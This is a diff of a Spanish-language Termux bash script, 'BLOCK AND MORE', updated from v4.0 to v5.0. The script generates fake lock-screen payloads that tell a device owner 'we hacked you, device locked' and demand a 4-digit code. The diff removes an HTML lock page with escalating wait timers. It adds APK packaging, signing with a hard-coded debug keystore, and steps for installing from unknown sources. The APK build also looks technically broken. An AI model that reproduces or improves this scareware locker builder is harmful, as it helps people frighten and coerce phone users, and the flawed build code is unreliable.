@@ -16,7 +16,7 @@ echo "   ██████╔╝██║     ██║   ██║██║   
 echo "   ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ "
 echo "   ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗"
 echo "   ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝"
-echo -e "${AMARILLO}        [ BLOCK AND MORE v4.0 ]${NC}\n"
+echo -e "${AMARILLO}        [ BLOCK AND MORE v5.0 ]${NC}\n"
 
 # ============================================
 # LISTA DE APPS
@@ -43,215 +43,31 @@ mostrar_menu() {
 }
 
 # ============================================
-# FUNCIÓN: GENERAR HTML WEB (ALTERNATIVA)
+# FUNCIÓN: GENERAR APK CON FIRMA
 # ============================================
-generar_html_block() {
-    local app="$1"
-    local codigo="$2"
-    
-    mkdir -p ~/storage/downloads/block_pages
-    
-    cat > ~/storage/downloads/block_pages/${app}_block.html << EOF
-<!DOCTYPE html>
-<html>
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>🔒 $app - BLOQUEADO</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{
-    font-family:Arial,sans-serif;
-    background:#CC0000;
-    min-height:100vh;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    overflow:hidden;
-}
-.container{
-    background:#FF0000;
-    padding:40px;
-    border-radius:20px;
-    width:400px;
-    text-align:center;
-    border:5px solid #FFFFFF;
-    box-shadow:0 0 50px rgba(255,0,0,0.8);
-    animation: pulse 1s infinite;
-}
-@keyframes pulse{
-    0%{box-shadow:0 0 50px rgba(255,0,0,0.8);}
-    50%{box-shadow:0 0 100px rgba(255,0,0,0.4);}
-    100%{box-shadow:0 0 50px rgba(255,0,0,0.8);}
-}
-.icono{font-size:80px;margin-bottom:10px}
-h1{
-    color:#FFFFFF;
-    font-size:32px;
-    font-weight:bold;
-    text-shadow:0 0 20px rgba(255,255,255,0.3);
-}
-.subtitle{
-    color:#FFFF00;
-    font-size:16px;
-    margin:10px 0 20px 0;
-}
-.mensaje{
-    color:#FFFFFF;
-    font-size:14px;
-    margin-bottom:20px;
-}
-input{
-    width:100%;
-    padding:15px;
-    font-size:20px;
-    border:none;
-    border-radius:10px;
-    text-align:center;
-    letter-spacing:5px;
-    background:#FFFFFF;
-    color:#000000;
-    margin-bottom:15px;
-}
-input:focus{outline:2px solid #FFFF00}
-.btn{
-    width:100%;
-    padding:15px;
-    font-size:18px;
-    font-weight:bold;
-    border:none;
-    border-radius:10px;
-    background:#FF0000;
-    color:#FFFFFF;
-    cursor:pointer;
-    border:2px solid #FFFFFF;
-    transition:all 0.3s;
-}
-.btn:hover{
-    background:#CC0000;
-    transform:scale(1.02);
-}
-.error{
-    color:#FFFF00;
-    font-size:14px;
-    margin-top:10px;
-    min-height:25px;
-}
-.timer{
-    color:#FFFFFF;
-    font-size:16px;
-    margin-top:5px;
-}
-.footer{
-    color:rgba(255,255,255,0.5);
-    font-size:11px;
-    margin-top:20px;
-}
-</style>
-</head>
-<body>
-<div class="container">
-    <div class="icono">⚠️</div>
-    <h1>¡TE HACKEAMOS!</h1>
-    <div class="subtitle">🔒 DISPOSITIVO BLOQUEADO 🔒</div>
-    <div class="mensaje">Ingresa el código de 4 dígitos para desbloquear</div>
-    <input type="password" id="codigo" maxlength="4" placeholder="CÓDIGO" inputmode="numeric">
-    <button class="btn" onclick="verificar()">🔓 DESBLOQUEAR</button>
-    <div class="error" id="error"></div>
-    <div class="timer" id="timer"></div>
-    <div class="footer">⚠️ Sitio de demostración</div>
-</div>
-<script>
-const CODIGO_CORRECTO = "$codigo";
-let intentos = 0;
-let bloqueado = false;
-let tiempoEspera = 0;
-let timerInterval = null;
-
-function verificar() {
-    if (bloqueado) {
-        document.getElementById('error').textContent = '⏳ Espera ' + tiempoEspera + ' segundos';
-        return;
-    }
-    
-    const codigo = document.getElementById('codigo').value;
-    
-    if (codigo === '') {
-        document.getElementById('error').textContent = '❌ Ingresa el código';
-        return;
-    }
-    
-    if (codigo === CODIGO_CORRECTO) {
-        document.getElementById('error').textContent = '✅ ¡CÓDIGO CORRECTO!';
-        document.getElementById('error').style.color = '#00FF00';
-        document.querySelector('.container').style.borderColor = '#00FF00';
-        document.querySelector('.container').style.animation = 'none';
-        setTimeout(() => {
-            document.body.innerHTML = '<div style="text-align:center;padding:50px;color:#fff;font-family:Arial;background:#1a1a1a;min-height:100vh;display:flex;justify-content:center;align-items:center;flex-direction:column;"><h1 style="color:#00FF00;">✅ DESBLOQUEADO</h1><p style="color:#fff;font-size:18px;">El dispositivo ha sido desbloqueado</p></div>';
-        }, 1500);
-    } else {
-        intentos++;
-        tiempoEspera = intentos * 60;
-        document.getElementById('error').textContent = '❌ CÓDIGO INCORRECTO. Espera ' + tiempoEspera + 's';
-        document.getElementById('error').style.color = '#FFFF00';
-        document.getElementById('codigo').value = '';
-        document.getElementById('codigo').focus();
-        bloqueado = true;
-        iniciarTemporizador();
-    }
-}
-
-function iniciarTemporizador() {
-    let tiempo = tiempoEspera;
-    document.getElementById('timer').textContent = '⏳ ' + tiempo + 's';
-    
-    if (timerInterval) clearInterval(timerInterval);
-    
-    timerInterval = setInterval(() => {
-        tiempo--;
-        document.getElementById('timer').textContent = '⏳ ' + tiempo + 's';
-        
-        if (tiempo <= 0) {
-            clearInterval(timerInterval);
-            bloqueado = false;
-            document.getElementById('timer').textContent = '';
-            document.getElementById('error').textContent = '✅ Puedes intentar de nuevo';
-            document.getElementById('error').style.color = '#00FF00';
-        }
-    }, 1000);
-}
-
-document.getElementById('codigo').addEventListener('keypress', function(e) {
-    if (e.key === 'Enter') verificar();
-});
-</script>
-</body>
-</html>
-EOF
-
-    echo -e "${VERDE}[✔] HTML generado en: ~/storage/downloads/block_pages/${app}_block.html${NC}"
-}
-
-# ============================================
-# FUNCIÓN: GENERAR APK SIMPLE
-# ============================================
-generar_apk_simple() {
+generar_apk() {
     local app="$1"
     local codigo="$2"
     
     echo -e "\n${VERDE}[✔] Generando APK para: ${BLANCO}$app${NC}"
     echo -e "${VERDE}[✔] Código de desbloqueo: ${AMARILLO}$codigo${NC}"
-    echo -e "${AMARILLO}[*] Creando APK simple...${NC}\n"
+    echo -e "${AMARILLO}[*] Creando APK firmada...${NC}\n"
     
+    # Instalar herramientas
+    pkg install apksigner openjdk-17 zip -y > /dev/null 2>&1
+    
+    # Crear carpeta temporal
     mkdir -p ~/block_temp
     cd ~/block_temp
     
-    # Crear estructura básica de APK
+    # ============================================
+    # CREAR ESTRUCTURA DE LA APK
+    # ============================================
+    
     mkdir -p META-INF
     mkdir -p res/drawable
     mkdir -p res/layout
     mkdir -p res/values
-    mkdir -p AndroidManifest.xml
     
     # 1. AndroidManifest.xml
     cat > AndroidManifest.xml << EOF
@@ -281,7 +97,7 @@ generar_apk_simple() {
 EOF
     
     # 2. Layout
-    cat > res/layout/main.xml << EOF
+    cat > res/layout/main.xml << 'EOF'
 <?xml version="1.0" encoding="utf-8"?>
 <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
     android:layout_width="match_parent"
@@ -374,19 +190,42 @@ EOF
 </resources>
 EOF
     
-    # 4. Icono simple (1x1 pixel)
+    # 4. Icono simple
     echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" | base64 -d > res/drawable/ic_launcher.png
     
-    # 5. Crear MANIFEST.MF
+    # 5. MANIFEST.MF
     cat > META-INF/MANIFEST.MF << EOF
 Manifest-Version: 1.0
 Created-By: BlockAndMore
 EOF
     
-    # 6. Crear ZIP (APK)
+    # 6. Crear ZIP
     echo -e "${AMARILLO}[*] Empaquetando APK...${NC}"
-    zip -r "${app}_block.apk" AndroidManifest.xml res/ META-INF/ 2>/dev/null
+    zip -r app_unsigned.apk AndroidManifest.xml res/ META-INF/ 2>/dev/null
     
+    # ============================================
+    # FIRMAR LA APK
+    # ============================================
+    echo -e "${AMARILLO}[*] Firmando APK...${NC}"
+    
+    # Generar keystore si no existe
+    if [ ! -f ~/debug.keystore ]; then
+        keytool -genkey -v -keystore ~/debug.keystore -alias debug -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Block, OU=Block, O=Phone, L=City, S=State, C=US" -storepass android -keypass android 2>/dev/null
+    fi
+    
+    # Firmar correctamente con apksigner
+    apksigner sign --ks ~/debug.keystore --ks-pass pass:android --key-pass pass:android --out "${app}_block.apk" app_unsigned.apk 2>/dev/null
+    
+    if [ ! -f "${app}_block.apk" ]; then
+        # Intentar con jarsigner si apksigner falla
+        echo -e "${AMARILLO}[*] Intentando con jarsigner...${NC}"
+        jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore ~/debug.keystore -storepass android -keypass android app_unsigned.apk debug 2>/dev/null
+        mv app_unsigned.apk "${app}_block.apk" 2>/dev/null
+    fi
+    
+    # ============================================
+    # MOVER A DESCARGA
+    # ============================================
     if [ -f "${app}_block.apk" ]; then
         mv "${app}_block.apk" ~/storage/downloads/
         cd ~
@@ -394,27 +233,23 @@ EOF
         
         clear
         echo -e "${CYAN}==================================================${NC}"
-        echo -e "${VERDE}[✔] ¡APK GENERADA CON ÉXITO!${NC}"
+        echo -e "${VERDE}[✔] ¡APK GENERADA Y FIRMADA CON ÉXITO!${NC}"
         echo -e "${CYAN}==================================================${NC}\n"
         echo -e "${BLANCO}[+] App: ${AMARILLO}$app${NC}"
         echo -e "${BLANCO}[+] Archivo: ${AMARILLO}~/storage/downloads/${app}_block.apk${NC}"
         echo -e "${BLANCO}[+] Código de desbloqueo: ${VERDE}$codigo${NC}"
-        echo -e "\n${ROJO}⚠️  NOTA:${NC} Esta APK es una versión SIMPLE"
-        echo -e "${AMARILLO}[!] Si no funciona, usa la versión HTML (también generada)${NC}"
-        echo -e "\n${BLANCO}[*] También se generó una página HTML:${NC}"
-        echo -e "${AMARILLO}   ~/storage/downloads/block_pages/${app}_block.html${NC}"
-        echo -e "${BLANCO}[*] Puedes abrirla en cualquier navegador${NC}"
+        echo -e "\n${VERDE}📱 INSTRUCCIONES DE INSTALACIÓN:${NC}"
+        echo -e "  1. Ve a Ajustes → Seguridad"
+        echo -e "  2. Activa 'Instalar apps de fuentes desconocidas'"
+        echo -e "  3. Abre el archivo desde Descargas"
+        echo -e "  4. Toca 'Instalar'"
+        echo -e "  5. Al abrir la app, ingresa: ${VERDE}$codigo${NC}"
         echo -e "\n${ROJO}[!] ADVERTENCIA:${NC} Solo para fines educativos"
         echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
     else
-        echo -e "${ROJO}[!] Error al generar APK. Generando HTML en su lugar...${NC}"
+        echo -e "${ROJO}[!] Error al generar la APK.${NC}"
         cd ~
         rm -rf ~/block_temp
-        generar_html_block "$app" "$codigo"
-        
-        echo -e "\n${VERDE}[✔] Página HTML generada:${NC}"
-        echo -e "${AMARILLO}   ~/storage/downloads/block_pages/${app}_block.html${NC}"
-        echo -e "${BLANCO}[*] Abre este archivo en cualquier navegador${NC}"
     fi
 }
 
@@ -430,7 +265,7 @@ while true; do
     echo "   ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ "
     echo "   ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗"
     echo "   ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝"
-    echo -e "${AMARILLO}        [ BLOCK AND MORE v4.0 ]${NC}\n"
+    echo -e "${AMARILLO}        [ BLOCK AND MORE v5.0 ]${NC}\n"
     
     mostrar_menu
     read -p ">> Selecciona una app (01-${#APPS[@]}): " opcion < /dev/tty
@@ -448,7 +283,7 @@ while true; do
             fi
         done
         
-        generar_apk_simple "$APP_SELECCIONADA" "$CODIGO"
+        generar_apk "$APP_SELECCIONADA" "$CODIGO"
         read -p "Presiona Enter para continuar..."
     else
         echo -e "${ROJO}[!] Opción inválida. Elige un número del 01 al ${#APPS[@]}.${NC}"
